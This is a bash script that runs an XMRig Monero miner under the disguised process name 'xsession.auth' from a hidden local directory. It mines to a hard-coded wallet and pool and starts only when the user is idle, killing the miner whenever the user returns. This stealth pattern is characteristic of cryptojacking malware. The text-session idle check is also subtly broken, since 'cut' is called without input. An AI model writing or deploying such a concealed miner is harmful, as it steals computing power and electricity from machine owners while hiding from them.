#!/bin/bash

XMRIGNAME=xsession.auth
WALLET=41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ
LOCAL_PATH=$HOME/.local
POOL=pool.hashvault.pro:80

cmd="$LOCAL_PATH/$XMRIGNAME -o $POOL -u $WALLET --coin monero -B"
echo "Command: $cmd"

isUI=$(who | grep -q "(:[0-9])" && echo 1 || echo 0)

run_xmr() {
	if ! pgrep $XMRIGNAME; then
		$cmd
	fi		 
}

while true
do 
	if [[ isUI -eq 1 ]]; then
		idle=$(xprintidle)
		echo "UI, idle for $idle"
		if [[ idle -gt 60000 ]]; then
			run_xmr
		else 
			pkill $XMRIGNAME 
		fi
	else
		idle=$(who -u | awk '{print $5}')
		echo "Text, idle for $idle"
		if [[ $idle == "old" ]]; then
			run_xmr
		elif [[ $idle != "." ]]; then 
			idleH=$(cut -d':' -f1)
			idleM=$(cut -d':' -f2)
			if [[ $idleH -gt 0 || $idleM -gt 1 ]]; then
				run_xmr
			else
				pkill $XMRIGNAME
			fi
		else 
			pkill $XMRIGNAME
		fi
	fi
	sleep 5
done